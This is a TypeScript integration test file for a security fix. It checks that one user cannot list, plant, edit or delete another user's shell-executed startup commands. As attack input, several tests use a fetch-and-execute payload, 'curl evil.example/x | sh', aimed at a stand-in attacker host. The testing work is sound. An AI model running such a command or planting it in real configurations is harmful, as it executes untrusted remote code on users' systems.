/**
 * Integration tests for startup-commands IDOR (security CR-6).
 *
 * Before the fix, the startup command CRUD had no ownership check, so a
 * logged-in user could read/plant/edit/delete commands on ANY project. Because
 * the `command` field is shell-exec'd by the runner's command-runner, this was
 * effectively command-injection. The CRUD is served by the `projects` tRPC
 * procedures (the REST `/api/projects/:id/commands` routes were removed and are
 * refused, see removed-rest-routes.test.ts).
 */
import { mockCoreGitRepoChecks } from '../helpers/module-mocks.js';

// Stub only the git-repo existence checks (project creation in this suite uses
// direct DB seeding, not real repos). The helper keeps the real path validators
// and restores the real module after this file (mock.module is process-global).
mockCoreGitRepoChecks();

import { beforeAll, beforeEach, describe, expect, test } from 'bun:test';

import { createTestApp, type TestApp } from '../helpers/test-app.js';
import { seedProject } from '../helpers/test-db.js';

describe('Startup commands IDOR (security CR-6)', () => {
  let t: TestApp;

  const headersFor = (userId: string) => ({
    'X-Test-User-Id': userId,
    'Content-Type': 'application/json',
  });

  const listCommands = async (userId: string, projectId: string) => {
    const input = encodeURIComponent(JSON.stringify({ projectId }));
    const res = await t.app.request(`/api/trpc/projects.commands?input=${input}`, {
      headers: headersFor(userId),
    });
    return { status: res.status, body: (await res.json()) as any };
  };

  const mutate = async (userId: string, procedure: string, input: unknown) => {
    const res = await t.app.request(`/api/trpc/projects.${procedure}`, {
      method: 'POST',
      headers: headersFor(userId),
      body: JSON.stringify(input),
    });
    return { status: res.status, body: (await res.json()) as any };
  };

  const plant = async () => {
    const created = await mutate('alice', 'createCommand', {
      projectId: 'p-alice',
      label: 'dev',
      command: 'npm run dev',
    });
    expect(created.status).toBe(200);
    return created.body.result.data.id as string;
  };

  beforeAll(async () => {
    t = await createTestApp();
  });

  beforeEach(() => {
    t.cleanup();
    // Two users, each with their own project.
    seedProject(t.db as any, {
      id: 'p-alice',
      name: 'Alice Project',
      userId: 'alice',
      path: '/tmp/alice',
    });
    seedProject(t.db as any, {
      id: 'p-bob',
      name: 'Bob Project',
      userId: 'bob',
      path: '/tmp/bob',
    });
  });

  test('commands — cross-tenant returns 404', async () => {
    expect((await listCommands('bob', 'p-alice')).status).toBe(404);
  });

  test('createCommand — cross-tenant returns 404 and does NOT plant', async () => {
    const evil = await mutate('bob', 'createCommand', {
      projectId: 'p-alice',
      label: 'pwn',
      command: 'curl evil.example/x | sh',
    });
    expect(evil.status).toBe(404);

    // Verify nothing was planted: the owner's own list is empty.
    const aliceList = await listCommands('alice', 'p-alice');
    expect(aliceList.status).toBe(200);
    expect(aliceList.body.result.data).toEqual([]);
  });

  test("updateCommand — cross-tenant cannot modify another user's command", async () => {
    const id = await plant();

    // Bob tries to overwrite via the OWNER's project id.
    const bobOwn = await mutate('bob', 'updateCommand', {
      projectId: 'p-alice',
      commandId: id,
      data: { label: 'dev', command: 'curl evil.example/x | sh' },
    });
    expect(bobOwn.status).toBe(404);

    // Bob also tries via his own project id (the command id belongs to Alice's).
    // Project access passes (Bob owns p-bob), but the repo-level WHERE on
    // projectId matches zero rows (defense in depth).
    await mutate('bob', 'updateCommand', {
      projectId: 'p-bob',
      commandId: id,
      data: { label: 'dev', command: 'curl evil.example/x | sh' },
    });
    const cmds = (await listCommands('alice', 'p-alice')).body.result.data as Array<{
      id: string;
      command: string;
    }>;
    expect(cmds.find((c) => c.id === id)?.command).toBe('npm run dev');
  });

  test("deleteCommand — cross-tenant cannot delete another user's command", async () => {
    const id = await plant();

    const res = await mutate('bob', 'deleteCommand', { projectId: 'p-alice', commandId: id });
    expect(res.status).toBe(404);

    // Row still exists.
    expect((await listCommands('alice', 'p-alice')).body.result.data).toHaveLength(1);
  });
});
